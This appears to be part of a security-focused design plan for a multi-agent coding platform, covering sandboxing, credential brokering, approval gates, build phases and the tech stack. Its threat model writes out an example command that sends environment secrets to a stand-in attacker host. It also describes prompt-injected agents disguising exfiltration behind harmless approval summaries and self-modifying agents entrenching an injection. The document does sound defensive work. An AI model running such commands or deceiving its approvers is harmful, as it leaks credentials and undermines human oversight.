**A3 — A hardcoded risky-tool list is not a boundary.** `Bash` subsumes every risky category, so a name-based list has two failure modes: gate every command (approval fatigue → rubber-stamping → theatre) or gate none (`curl -d @/proc/self/environ evil.com` passes). Edit-then-Bash launders anything past a syntactic classifier. Fix: **classify on effect, not tool name** — deny-by-default network egress plus a write-path allowlist enforced *at the sandbox*, with the approval card as UX on top of a real boundary. Cards must render the **exact argv/diff from the tool-call payload, never a model-authored summary** (an injected agent writes "running unit tests" over an exfil command). Bind approval to a **hash of the exact call**; mutated args require re-approval — "edit-and-approve" is otherwise a TOCTOU generator.

**A5 — Sandbox spec, explicitly.** "Scoped fs/net" is not a spec, and unspecified means insecure-by-default. Required: `--network=none` by default with all egress through the authenticating proxy; **never** mount the container socket; `--cap-drop=ALL --security-opt=no-new-privileges`; default seccomp (never `unconfined`); non-root UID in a userns; read-only rootfs with tmpfs `/tmp`; mount **only** the run's clone — never `$HOME`, `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.claude`, `~/.gitconfig`; memory/pids/cpu limits and a wall-clock kill. Platform asymmetry to note: rootless Podman gets a VM boundary on macOS but **not** on Linux — hence microVM isolation (§8). Accept the honest limit: **the model API call is itself an unblockable exfiltration channel**, so the real control is "secrets never enter the sandbox," not "the sandbox can't talk out."

**A6 caveat found in implementation — the Claude Agent SDK defeats credential brokering for its own key.** [NEW]
The broker below works, and is built: a run presents an opaque per-run token, the
proxy attaches the real credential, meters authoritatively, and enforces the host
allowlist. Verified end to end with ordinary HTTP clients.

It does **not** work for the Claude Agent SDK's own model calls, for a reason outside
this platform's control. The SDK's bundled native CLI validates `ANTHROPIC_API_KEY`
*client-side* before making any request — prefix, length, and something
checksum-shaped, since randomly generated keys of identical shape are accepted or
rejected depending on the draw. When that check fails the CLI ignores
`ANTHROPIC_BASE_URL` entirely and contacts `api.anthropic.com` directly. It also
rewrites the key it forwards (a 109-character value arrived as 108, then 102), so the
token cannot ride on it even when accepted, and `ANTHROPIC_CUSTOM_HEADERS` did not
arrive at all. `ANTHROPIC_AUTH_TOKEN` alone selects the OAuth path and reports "Not
logged in".

Consequences, stated rather than papered over:

- A sandboxed Claude Agent run needs a **real, valid** model key inside the sandbox.
  A6's "the sandbox gets zero long-lived credentials" is therefore **not achieved for
  that one credential**, and this plan should not claim otherwise.
- What still holds: egress is deny-by-default, so the key is only *usable* through the
  proxy (`api.anthropic.com` is not on the CONNECT allowlist), metering and budget
  enforcement remain authoritative, and no other secret enters the sandbox. The
  residual exposure is exfiltration of that one key — which A5 already concedes is
  hard to prevent, since the model API call is itself an unblockable channel.
- **Why not use subscription auth instead of a key at all?** Because both constraints
  point the same way. §8 records the SDK's license condition — claude.ai
  login/subscription limits may not be exposed to your users, API keys only — and
  subscription auth would additionally require mounting the host's `~/.claude`
  credentials into the sandbox, which A5 forbids outright. The CLI's "Not logged in"
  on the OAuth path is that absence working as intended, not a misconfiguration.
- **The open fork**, worth deciding explicitly rather than by default, is which backend
  a *sandboxed* run uses:
  1. Claude Agent SDK with a real key in the sandbox — works today, A6 weakened for
     that one credential. This is what Phase 1 ships.
  2. A brokerable backend for sandboxed runs — `VllmApiAdapter`/`CodexAdapter` (§7
     Phase 3) are plain HTTP clients with no client-side key validation, so the broker
     works unchanged. Already on the roadmap for other reasons, so it costs nothing
     extra. **Preferred durable answer.**
  3. Drop the SDK and drive the Messages API directly, owning the agent loop. A6 then
     holds fully, but this rebuilds exactly what §4b decided not to — the unit of work
     is a coding agent that already has its own loop, tools, permissions and session
     state. A strategy change, not a fix; only justified if (2) also proves unworkable.
- Provider-issued per-run scoped keys would solve it cleanly and do not exist today.
- An in-container loopback shim is built and retained regardless: it attaches the lease
  token so the proxy can still attribute and meter spend per run, which is what budget
  caps depend on.

**A6 — Secrets via broker, not decryptable files.** Giving a run the age private key means one injection yields every workspace secret permanently, and decrypted env vars leak into transcripts (agents echo env) which flow to blob storage and the UI. Fix: keys stay on the host; the sandbox gets **zero long-lived credentials** and presents a per-run opaque token to a **credential-injecting egress proxy** that attaches the real secret, enforces host/method allowlists, and logs. Routing model API calls through the same proxy also yields **authoritative cost metering** instead of trusting model self-reported tokens. Anything unavoidably in-container is short-lived and single-scope. Redact at transcript-write time; set a retention policy.

**A7 — Trust boundary between planner and worker.** Worker output is untrusted text a planner acts on with more authority. Fix: **planner personas get `tools: []`** — decomposition emits structured output only, so poisoned input cannot become planner execution. Worker→planner reports are schema-validated typed structs with untrusted-data framing (a mitigation, not a boundary — stated as such). `parent_run_id` attenuates capability (§5).

**A8 — XSS here means "attacker approves actions."** The UI session can call the whole contract, so one XSS forges approvals and reads every transcript. Fix: markdown with raw HTML disabled; no `dangerouslySetInnerHTML`/`v-html` on model text; href scheme allowlist (`javascript:`/`data:`/`vbscript:` blocked); no model-supplied SVG; escaped highlighting. **Tool results and filenames are untrusted too**, not just prose. Serve blob artifacts from a **separate origin** with `Content-Disposition: attachment` and a sandboxed iframe — a stored HTML artifact on the app origin is same-origin XSS. Nonce CSP, no `unsafe-inline`. Step-up re-auth for approvals so a stolen session can't silently approve.

**A9 — Runner pairing over-grants.** A per-workspace pairing token means pairing a Runner gives every workspace member shell on that machine. Fix: Runner binds to an owning user; channels/personas need an explicit grant to target it; pairing tokens are single-use, short-TTL, exchanged for a per-Runner credential.

**Runtime safety mechanics** (all previously missing): heartbeat + stuck detection (same tool call N times, no progress in T minutes); dead-run reaper; **idempotency keys on run steps** — BullMQ retrying a half-committed agent run is actively dangerous; enforced budget caps with pre-flight estimate, per-turn check, and hard kill, metered at the proxy; **approval SLA** (timeout → auto-deny → resumable); and a **global kill switch / pause-all**. One button. Nothing had one. **Heartbeat + no-progress detection and the dead-run reaper are built** (see HANDOFF.md) — same-tool-call-N-times detection, idempotency keys, budget caps, approval SLA, and the kill switch are not.

---

## 7. Build phases

**Timelines corrected upward.** The original estimates costed the happy path and omitted the distributed-systems work and every security mitigation above.

### Phase 0 — Foundations, ~3 weeks (was 1)
Monorepo scaffold; Postgres/Valkey via compose; **Better Auth**; channel/thread/message CRUD with realtime. A working Slack clone, zero agents.
Non-negotiable from day one because retrofitting is ruinous: **actor + `workspace_id` on every row and authz check**, **append-only audit log**, the **ESLint boundary rule + architecture test** (§4a), and realtime's hidden costs — reconnect, backfill, message ordering, idempotency, unread state, pagination.

### Phase 1 — One agent, end to end, ~10–14 weeks solo (was 4–6)
The happy path (SDK stream → WS → render) is a weekend. The rest is the actual work:
- `ClaudeAgentAdapter` **only** (see cuts below).
- `apps/runner` as a real distributed component: pairing, reconnect, **run resumption after Runner restart**, orphaned-container cleanup, backpressure, event ordering/idempotency into an append-only log.
- **Pausable/resumable agent loop** for the approval gate — `canUseTool`/`PreToolUse` hook round-tripping a human across two WS hops while the run stays suspended (§4d). Hardest single piece.
- Sandbox to A5 spec, clone-per-run (§5a), egress proxy + credential broker (A6), host-side push policy (A2), effect-based gating (A3).
- Repository binding: allowed roots, directory picker, bind/create repo, end-of-run diff review with merge/keep/discard. **Keep/discard/push all built** (see HANDOFF.md) — "merge" shipped as `agentRun.push` (host-side push + best-effort PR/MR via `gh`/`glab`), not a local `git merge`; see §6 A2 for why.
- **Inbox + notifications + stuck detection** — the retention hook (§3), not a Phase 4 nicety. **Built** (see HANDOFF.md): heartbeat + no-progress dead-run reaper, and an Inbox view surfacing runs awaiting approval or with an unreviewed diff. Visually verified in a real browser this session (toggle/badge/row-select/diff-load/keep all confirmed working end to end).
- Persona editing including tool declaration, skills, and harness settings (§4e); transcript persistence; cost metering at the proxy.
- Built-in personas, persona groups, and `@mention`-starts-a-run (§3a) — built; closes this section's own ship criterion's `@mention` gap. Per-persona `harness.autoApprove` also landed alongside it (not originally scoped in §3a, added on request) — see HANDOFF.md.

**Cut from Phase 1** (all from the product review, all correct):
- **`OllamaApiAdapter`** — a tool-less HTTP adapter proves nothing about the hard parts of `AgentExecutionPort` (sandboxing, streaming, interrupt, approval callbacks). It was abstraction theatre. Add in Phase 3 with vLLM.
- **`apps/tui`** — enforce contract discipline with the lint rule plus one integration test, not a second client. The contract stays client-agnostic by construction (§4a/§4c); proving it needs a test, not an app.
- **Form-based persona builder** — ship a textarea with frontmatter validation.
- **SeaweedFS** — local filesystem behind `BlobStoragePort`; swap in Phase 3.

**Ship criterion**: a human creates a persona, `@mention`s it, watches it work on a real repo, is notified when it needs them, approves one gate whose card shows exact argv, and merges a reviewed diff — with no path by which the agent could have approved itself or pushed on its own.

### Phase 2 — Planner + Swarm, ~6–10 weeks
- Planner with `tools: []`, structured decomposition, child runs, aggregation. Build on the SDK's `Workflow`/`SendMessage` rather than a hand-rolled scheduler (§4d).
- **Reconciliation: agent-led, with a mechanical fallback.** The target is a reconciler *agent* that merges sibling branches and resolves contradictions, so that reconciliation scales with agents rather than with human attention. But "a reconciler agent resolves conflicts" is a research problem, not a ticket, so it ships behind a **serialized merge queue** that is always the fallback: rebase in order, run tests, and on failure hand the branch back to its owning run. Build the queue first (it is deterministic and cheap), then let the reconciler agent attempt each merge with the queue catching what it gets wrong. Measure agent-reconciled merge *correctness* and token cost before trusting it unsupervised.
- **Do not build a custom VCS.** Cursor needed one at ~1,000 commits/sec because git's locking could not keep up — that is a major project in its own right and is not justified below double-digit concurrent workers. Plain clone-per-run (§5a) is sufficient at the scale this plan targets; revisit only if git contention is measured, not anticipated.
- **Human intervention becomes checkpoint-shaped, not merge-shaped.** As reconciliation moves to agents, the human's role narrows to explicitly-placed gates — labeling/judgement steps, approvals on risky effects (§6 A3), and arbitration when the reconciler and merge queue disagree. Those checkpoints are declared per team/persona rather than triggered by every conflict.
- **MCP server registry + per-persona attachment** (§4e) — registry is small; credential-broker integration and the review/tool-hash-pinning flow are the real work.
- Dependency cache / base image (§5a) — otherwise per-run install cost caps swarm throughput.
- Tree view + visual team composition (§3).
- Kanban; cost dashboard.

### Phase 3 — Multi-backend + hardening, ~6 weeks
`CodexAdapter`, `CursorAdapter`, `VllmApiAdapter`/`OllamaApiAdapter` — real proof the port holds. microVM isolation (Kata/microsandbox). SeaweedFS swap. Decorrelated review pass. Verification harness (test-runner integration + definition-of-done for principle #6). **Validated compaction** (§4d-ter item 1) — same shape as the verification harness, so they land together. Persona sharing. Decide the §4d nesting policy. The verification harness is also the hard prerequisite for Phase 3b (§4f), so treat it as load-bearing rather than a nicety.

### Phase 3b — Ouroboros mode, ~8–12 weeks (§4f)
Sequenced after Phase 3 rather than inside it because every tier depends on the
verification harness existing: a self-modifying agent without an automated
definition-of-done is a random mutation generator.

- **Envelope** on `agent_persona` (max tools, model tier, budget, path scope, MCP
  refs, subagent depth), validated on every self-modification, widenable only by a
  human through the contract. This is the prerequisite for all five tiers — build it
  first and alone, since it is also the thing that keeps tiers 2–4 from being
  unbounded.
- **Tier 1 + 2**: self-edit of prompts, then of tools/capabilities within the
  envelope. Cheap, and they exercise the envelope check on real traffic before
  anything with a large blast radius depends on it.
- **Tier 5**: durable per-persona memory and identity across runs and restarts,
  built on §4d-ter's extract-then-store and validated compaction. Sequenced *before*
  tiers 3–4 because continuity is what makes a code rewrite meaningful rather than
  just an edit, and because a memory bug is far cheaper to find than a promotion bug.
- **Tier 3 + 4**: code/architecture, then dependencies, both strictly
  build-and-promote (§4f) with health-checked swap and retained previous revision.
  Dependency changes get their own acknowledged-classifier gate, mirroring the
  CI-config gate `push-policy.ts` already implements.
- **Rollback drill** as an explicit deliverable, not an assumption: a scripted
  exercise that promotes a knowingly-broken self-modification and recovers from it
  without the modified code participating. Until that drill passes, tiers 3–4 stay
  off by default.

### Phase 4 — Production, ongoing
Full RBAC, compliance export, gradual rollout so runs aren't disrupted mid-task, multi-org, external integrations, MCP client behind an interface (target spec `2025-11-25`, plan for the stateless `2026-07-28` revision — it makes horizontal scaling much easier), A2A only at the external boundary.

---

## 8. Tech stack — all versions and licenses verified July 2026

Constraint: every **platform** component is OSI-approved open source and self-hostable locally. The agent execution layer is explicitly exempt (see below) — that's a property of frontier models, not a plumbing choice.

| Layer | Choice | Version | License | Note |
|---|---|---|---|---|
| UI | **Vite + Vue 3** | Vue 3.5+ | MIT | **[CORRECTED from Next.js]** auth-gated WS-driven SPA; Next Route Handlers structurally can't host WS |
| Graph canvas | **Vue Flow** | 1.x | MIT | separate community project from xyflow's React Flow; good parity, the one ecosystem downgrade in the Vue switch |
| Components | shadcn-vue / PrimeVue | — | MIT | Tailwind 4.3.x is CSS-first config (`@theme`, no JS config file) |
| Virtualization | TanStack Virtual | — | MIT | framework-agnostic |
| View state | Pinia | 3.x | MIT | view state only; logic lives in `client-core` |
| Contract | **oRPC** | 1.14.x | MIT | **[CORRECTED from tRPC]** tRPC is TS-only + React-first; oRPC adds OpenAPI for non-TS clients. `ts-rest` rejected — stalled since Mar 2025 |
| Validation | Zod | 4.4.x | MIT | Standard Schema makes the validator itself swappable |
| API + WS service | **Fastify** | 5.10.x | MIT | mature `@fastify/websocket`; Hono's `@hono/node-ws` is deprecated — churn in exactly this subsystem |
| **Auth** | **Better Auth** | 1.6.x | MIT | **[CRITICAL CORRECTION]** Auth.js/NextAuth was **officially deprecated Sept 2025**, handed to the Better Auth team; v5 has been beta ~3 years and **will never ship stable**. Better Auth ships passkeys, 2FA, orgs/teams, DB sessions with immediate invalidation. Zitadel if enterprise SSO/SAML later |
| DB | Postgres | **18.x** | PostgreSQL | supported to Nov 2030; don't build on the 19 beta |
| ORM | Drizzle | **pin 0.45.x** | Apache-2.0 | healthy (PlanetScale hired the core team) but 1.0 has sat in RC a long time — don't start on an RC |
| Queue | **BullMQ** (not `bull`) | 5.81.x | MIT | original `bull` hit EOL 2026 |
| Pub/sub | **Valkey** | 9.x | BSD-3 | Redis re-added an OSI license (tri-licensed incl. AGPLv3) so it's open again — but only via copyleft. Valkey stays the default; BullMQ supports both |
| Blob storage | local FS → **SeaweedFS** | 4.x | Apache-2.0 | **MinIO is dead** — repo archived Feb 2026, OSS edition abandoned for proprietary AIStor. Garage is capable but AGPL; RustFS is alpha |
| Container runtime | Podman | 6.x | Apache-2.0 | daemonless, rootless, no licensing exposure. Docker *Engine* is still Apache-2.0; only Docker **Desktop** needs a paid subscription at scale |
| Agent-code isolation | **Kata / microsandbox** | — | Apache-2.0 | **containers are not a sufficient boundary for LLM-generated code** — shared kernel. microVMs give a per-sandbox kernel. **Avoid Daytona — closed-source June 2026** |
| Secrets | egress-proxy broker; SOPS 3.13.x + age host-side | — | MPL-2.0 / BSD | see §6 A6. OpenBao (Vault went BSL) if a dynamic-secrets server is wanted |
| Monorepo | pnpm + Turborepo | 11.x / 2.10.x | MIT | Turborepo is a task runner over pnpm workspaces — removing it is a config deletion, not a rewrite |
| Orchestration (scale) | k3s | 1.36.x | Apache-2.0 | CNCF, SUSE-backed |

**Agent execution layer — the OSS exemption, stated honestly.** Claude Agent SDK is under **Anthropic Commercial Terms, not OSS** (with two license traps: no exposing claude.ai login/subscription limits to your users, and "Claude Code" branding prohibited). Codex SDK is Apache-2.0; Cursor SDK is proprietary beta. The only genuinely open-all-the-way-down path is vLLM/Ollama plus open weights. So: **platform = 100% OSS + local, guaranteed. Agent brains = not, unless you choose the open-weight path.** The `AgentExecutionPort` boundary is what keeps that a per-persona choice.

**Claude model IDs mid-2026**: `claude-fable-5` (top capability, 1M ctx, $10/$50 per Mtok), `claude-opus-5` (agentic-coding default, $5/$25), `claude-sonnet-5` ($3/$15), `claude-haiku-4-5-20251001`. **Best open-weight tool-callers**: GLM-5.2, Kimi K2.6/K3, DeepSeek V4 (best self-hosted price/perf), Qwen 3.6 Plus. Llama and Mistral have dropped out of the top tier for agentic use.

---

## 9. Economics

Track cost per `agent_run`, rolled up per thread/team/workspace, **metered at the egress proxy** rather than from model self-report (A6). Default tiers: Planner = `claude-opus-5` or `claude-fable-5`; Workers = `claude-sonnet-5` or `claude-haiku-4-5`. Live cost meter in the UI, changeable per persona — Cursor's 8x swing came from worker model choice, so it must be visible, not buried in config. Budget caps are **enforced** (pre-flight estimate, per-turn check, hard kill), not advisory.

---

## 10. Risks

- **Cost runaway** → enforced caps at the proxy, visible meter, single-agent default.
- **Context rot** → checkpoint to external memory past a token threshold; compact and reinitiate. Compaction must be *validated*, not assumed — one-shot summarization has been measured dropping accuracy below no-context-at-all (§4d-ter).
- **Concurrent conflicts** → clone-per-run + serialized merge queue (not an agent).
- **Prompt injection → RCE** → §6 in full; the load-bearing controls are "secrets never enter the sandbox" and "the agent never pushes."
- **Sandbox escape** → microVM isolation; containers alone are insufficient.
- **Approval theatre** → effect-based gating, exact-argv cards, hash-bound approvals.
- **UI overload** → condensed by default, raw one click away; inbox over stream.
- **Vague delegation** → schema-validated decomposition, both directions.
- **Per-run build cost** → base image + dependency cache before swarms are useful.
- **Self-modification makes an injection permanent** (§4f) → the envelope bounds what a rewrite can reach, promotion is never in place so a bad rewrite cannot destroy its own rollback path, dependency edits need a separately acknowledged human decision, and every self-modification is an append-only audit event naming the authoring run. The residual risk is accepted knowingly: a persona with a wide envelope and a long-lived memory is the highest-value target in the system.

---

## 11. The riskiest assumption — test it in week 2

**That parallel swarm workers on one shared codebase produce mergeable, net-positive work.** Tree view, kanban, merge queue, cost dashboard, and the entire planner/worker narrative all depend on it. The plan previously over-extended Cursor's evidence: their 8x result is about planner-vs-worker *model choice on a task*, not N-way parallelism on one repo.

**Test it with a shell script and zero UI, in week 2**: three clones, three workers, one real repo, one decomposed goal. Measure human minutes to reconcile versus doing it serially. If reconciliation costs more than it saves, the product is *"one strong agent per task with excellent intervention UX"* — still valuable, still worth building, but a different product in which most of Phase 2 is dead weight. Better to learn that in week 2 than month 6.

---

## 12. How to build it

Dogfood: drive Claude Agent SDK headless the way Phase 1's adapter will, with personas for frontend/backend/schema work, orchestrated by you as the human planner until Phase 2 lets the app orchestrate itself.

**Immediate next step**: Phase 0 scaffold — pnpm monorepo, Vite+Vue app, Fastify server + separate WS gateway, Postgres/Valkey compose, Better Auth, channel/thread/message CRUD with realtime, plus the actor model, audit log, and boundary lint rule from day one.
